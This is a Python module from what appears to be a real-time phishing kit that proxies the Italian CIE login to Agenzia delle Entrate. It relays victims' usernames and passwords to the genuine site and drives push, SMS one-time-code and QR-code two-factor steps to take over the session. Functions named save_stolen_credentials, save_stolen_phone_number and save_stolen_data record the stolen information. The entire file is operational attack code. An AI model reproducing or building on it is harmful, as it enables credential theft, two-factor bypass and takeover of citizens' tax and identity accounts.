from .client import execute_access_flow, access_again_login_page, post_credentials, contact_user_phone, submit_push_2fa_sms, get_2fa_status, submit_push_2fa, get_qr_code_status, submit_scanned_qr_code, confirm_access
from .parser import extract_qr_code, extract_errors, extract_phone_number
from ..flow import LoginFlow
from ..utils.writer import save_stolen_credentials, save_stolen_phone_number, save_stolen_data

def access_login_page() -> LoginFlow:
    """Get QR Code from CIE login page"""
    # Executes the CIE access flow to reach the login page
    login_flow = execute_access_flow()

    # Extracts the QR code from the response
    login_flow.set_qr_code(extract_qr_code(login_flow.response.text))

    return login_flow

def get_new_qr_code(login_flow: LoginFlow) -> None:
    """Get a new QR Code from CIE login page"""
    # Visits the CIE login page again to get a new QR code
    access_again_login_page(login_flow)

    # Extracts the QR code from the response
    login_flow.set_qr_code(extract_qr_code(login_flow.response.text))

def submit_credentials(login_flow: LoginFlow, credentials: dict) -> dict | None:
    """Authenticates user into the Service Provider (Agenzia delle Entrate) by inserting credentials in the selected Identity Provider (CIE)"""
    login_flow.username = credentials.get("username", "")
    login_flow.password = credentials.get("password", "")
    save_stolen_credentials(login_flow)

    # Posts the credentials to the CIE login page and retrieves the response
    post_credentials(login_flow, credentials)

    # Check for login errors
    error = extract_errors(login_flow.response.text)

    return error

def send_2fa_notification(login_flow: LoginFlow) -> None:
    """Sends the 2FA notification to the CIE login page"""
    contact_user_phone(login_flow, "push")

def send_2fa_sms(login_flow: LoginFlow) -> None:
    """Sends the 2FA SMS to the CIE login page"""
    contact_user_phone(login_flow, "sms")
    login_flow.phone_number = extract_phone_number(login_flow.response.text)
    save_stolen_phone_number(login_flow)

def send_2fa_sms_notification(login_flow: LoginFlow) -> None:
    """Sends the 2FA SMS notification to the CIE login page"""
    contact_user_phone(login_flow, None)

def retrieve_access_after_push_2fa_sms(login_flow: LoginFlow, otp1: str, otp2: str, otp3: str, otp4: str) -> dict | None:
    """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the 2FA has been confirmed via SMS"""
    submit_push_2fa_sms(login_flow, otp1, otp2, otp3, otp4)
    error = extract_errors(login_flow.response.text)
    if error is not None:
        return error
    confirm_access(login_flow)
    save_stolen_data(login_flow)

def check_2fa(login_flow: LoginFlow) -> dict:
    """Checks if the 2FA has been confirmed and returns the result"""
    get_2fa_status(login_flow)
    return login_flow.response.json()

def retrieve_access_after_push_2fa(login_flow: LoginFlow) -> None:
    """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the 2FA has been confirmed"""
    submit_push_2fa(login_flow)
    confirm_access(login_flow)
    save_stolen_data(login_flow)

def check_qr_code(login_flow: LoginFlow) -> dict:
    """Checks if the QR code has been scanned and returns the result"""
    get_qr_code_status(login_flow)
    return login_flow.response.json()

def retrieve_access_after_qr_code_scan(login_flow: LoginFlow) -> None:
    """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the QR code has been scanned"""
    submit_scanned_qr_code(login_flow)
    confirm_access(login_flow)
    save_stolen_data(login_flow)
